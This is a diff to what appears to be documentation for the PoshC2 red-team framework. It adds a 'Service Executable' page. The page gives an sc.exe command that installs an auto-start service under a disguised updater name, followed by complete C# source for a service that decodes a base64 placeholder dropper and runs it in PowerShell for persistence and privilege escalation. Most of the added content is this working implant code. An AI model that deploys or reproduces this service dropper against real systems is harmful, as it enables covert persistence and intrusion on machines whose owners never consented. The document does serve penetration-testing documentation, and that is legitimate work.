@@ -90,6 +90,7 @@
               <ul class="current">
 <li class="toctree-l1"><a class="reference internal" href="../install_and_setup/index.html">Installation &amp; Setup</a></li>
 <li class="toctree-l1 current"><a class="reference internal" href="index.html">Execution / Payloads</a><ul class="current">
+<li class="toctree-l2"><a class="reference internal" href="core.html">Core Dropper</a></li>
 <li class="toctree-l2"><a class="reference internal" href="bat.html">Bat File</a></li>
 <li class="toctree-l2"><a class="reference internal" href="exe.html">Stand Alone Executable</a></li>
 <li class="toctree-l2 current"><a class="current reference internal" href="#">Service Executable</a></li>
@@ -178,6 +179,75 @@
             
   <div class="section" id="service-executable">
 <h1>Service Executable<a class="headerlink" href="#service-executable" title="Permalink to this headline">¶</a></h1>
+<p>Mitre ATT&amp;CK - <a class="reference external" href="https://attack.mitre.org/wiki/Technique/T1050">New Service</a></p>
+<p>The following C# code creates the service executable used in PoshC2, where escalation of privileges via service abuse is possble. The code essentially creates a new Powershell Runspace using the System.Management.Automation.dll (v2.0.50727) that is supplied with the project. This executable is not signed and cannot be called directly, must be installed and run via the Windows Service Control Manager. To add a service on the command line use the following command:</p>
+<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">sc</span><span class="o">.</span><span class="n">exe</span> <span class="n">create</span> <span class="n">CPUpdater</span> <span class="n">binpath</span><span class="o">=</span> <span class="s1">&#39;C:\Temp\PoshService.exe&quot; Displayname= CheckpointServiceUpdater start= auto</span>
+</pre></div>
+</div>
+<p>C# Code:</p>
+<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">using</span> <span class="n">System</span><span class="o">.</span><span class="n">Text</span><span class="p">;</span>
+<span class="n">using</span> <span class="n">System</span><span class="o">.</span><span class="n">ServiceProcess</span><span class="p">;</span>
+<span class="n">using</span> <span class="n">System</span><span class="o">.</span><span class="n">Collections</span><span class="o">.</span><span class="n">ObjectModel</span><span class="p">;</span>
+<span class="n">using</span> <span class="n">System</span><span class="o">.</span><span class="n">Management</span><span class="o">.</span><span class="n">Automation</span><span class="p">;</span>
+<span class="n">using</span> <span class="n">System</span><span class="o">.</span><span class="n">Management</span><span class="o">.</span><span class="n">Automation</span><span class="o">.</span><span class="n">Runspaces</span><span class="p">;</span>
+
+
+<span class="n">namespace</span> <span class="n">Service</span>
+<span class="p">{</span>
+    <span class="n">static</span> <span class="k">class</span> <span class="nc">Program</span>
+    <span class="p">{</span>
+        <span class="n">static</span> <span class="n">void</span> <span class="n">Main</span><span class="p">()</span>
+        <span class="p">{</span>
+            <span class="n">ServiceBase</span><span class="p">[]</span> <span class="n">ServicesToRun</span><span class="p">;</span>
+            <span class="n">ServicesToRun</span> <span class="o">=</span> <span class="n">new</span> <span class="n">ServiceBase</span><span class="p">[]</span>
+            <span class="p">{</span>
+                <span class="n">new</span> <span class="n">Service1</span><span class="p">()</span>
+            <span class="p">};</span>
+            <span class="n">ServiceBase</span><span class="o">.</span><span class="n">Run</span><span class="p">(</span><span class="n">ServicesToRun</span><span class="p">);</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="n">public</span> <span class="n">partial</span> <span class="k">class</span> <span class="nc">Service1</span> <span class="p">:</span> <span class="n">ServiceBase</span>
+    <span class="p">{</span>
+        <span class="n">public</span> <span class="n">static</span> <span class="n">string</span> <span class="n">InvokeAutomation</span><span class="p">(</span><span class="n">string</span> <span class="n">cmd</span><span class="p">)</span>
+        <span class="p">{</span>
+            <span class="n">Runspace</span> <span class="n">newrunspace</span> <span class="o">=</span> <span class="n">RunspaceFactory</span><span class="o">.</span><span class="n">CreateRunspace</span><span class="p">();</span>
+            <span class="n">newrunspace</span><span class="o">.</span><span class="n">Open</span><span class="p">();</span>
+            <span class="n">RunspaceInvoke</span> <span class="n">scriptInvoker</span> <span class="o">=</span> <span class="n">new</span> <span class="n">RunspaceInvoke</span><span class="p">(</span><span class="n">newrunspace</span><span class="p">);</span>
+            <span class="n">Pipeline</span> <span class="n">pipeline</span> <span class="o">=</span> <span class="n">newrunspace</span><span class="o">.</span><span class="n">CreatePipeline</span><span class="p">();</span>
+
+            <span class="n">pipeline</span><span class="o">.</span><span class="n">Commands</span><span class="o">.</span><span class="n">AddScript</span><span class="p">(</span><span class="n">cmd</span><span class="p">);</span>
+            <span class="n">Collection</span><span class="o">&lt;</span><span class="n">PSObject</span><span class="o">&gt;</span> <span class="n">results</span> <span class="o">=</span> <span class="n">pipeline</span><span class="o">.</span><span class="n">Invoke</span><span class="p">();</span>
+            <span class="n">newrunspace</span><span class="o">.</span><span class="n">Close</span><span class="p">();</span>
+
+            <span class="n">StringBuilder</span> <span class="n">stringBuilder</span> <span class="o">=</span> <span class="n">new</span> <span class="n">StringBuilder</span><span class="p">();</span>
+            <span class="n">foreach</span> <span class="p">(</span><span class="n">PSObject</span> <span class="n">obj</span> <span class="ow">in</span> <span class="n">results</span><span class="p">)</span>
+            <span class="p">{</span>
+                <span class="n">stringBuilder</span><span class="o">.</span><span class="n">Append</span><span class="p">(</span><span class="n">obj</span><span class="p">);</span>
+            <span class="p">}</span>
+            <span class="k">return</span> <span class="n">stringBuilder</span><span class="o">.</span><span class="n">ToString</span><span class="p">()</span><span class="o">.</span><span class="n">Trim</span><span class="p">();</span>
+        <span class="p">}</span>
+
+        <span class="n">protected</span> <span class="n">override</span> <span class="n">void</span> <span class="n">OnStart</span><span class="p">(</span><span class="n">string</span><span class="p">[]</span> <span class="n">args</span><span class="p">)</span>
+        <span class="p">{</span>
+            <span class="k">try</span>
+            <span class="p">{</span>
+                <span class="n">string</span> <span class="n">tt</span> <span class="o">=</span> <span class="n">System</span><span class="o">.</span><span class="n">Text</span><span class="o">.</span><span class="n">Encoding</span><span class="o">.</span><span class="n">Unicode</span><span class="o">.</span><span class="n">GetString</span><span class="p">(</span><span class="n">System</span><span class="o">.</span><span class="n">Convert</span><span class="o">.</span><span class="n">FromBase64String</span><span class="p">(</span><span class="s2">&quot;&lt;base64 encoded core dropper&gt;&quot;</span><span class="p">));</span>
+                <span class="n">InvokeAutomation</span><span class="p">(</span><span class="n">tt</span><span class="p">);</span>
+            <span class="p">}</span>
+            <span class="n">catch</span> <span class="p">(</span><span class="n">ArgumentException</span> <span class="n">e</span><span class="p">)</span>
+            <span class="p">{</span>
+                <span class="n">string</span> <span class="n">tt</span> <span class="o">=</span> <span class="n">System</span><span class="o">.</span><span class="n">Text</span><span class="o">.</span><span class="n">Encoding</span><span class="o">.</span><span class="n">Unicode</span><span class="o">.</span><span class="n">GetString</span><span class="p">(</span><span class="n">System</span><span class="o">.</span><span class="n">Convert</span><span class="o">.</span><span class="n">FromBase64String</span><span class="p">(</span><span class="s2">&quot;&lt;base64 encoded core dropper&gt;&quot;</span><span class="p">));</span>
+                <span class="n">InvokeAutomation</span><span class="p">(</span><span class="n">tt</span><span class="p">);</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+
+        <span class="n">protected</span> <span class="n">override</span> <span class="n">void</span> <span class="n">OnStop</span><span class="p">()</span>
+        <span class="p">{</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</pre></div>
+</div>
 </div>
 
 
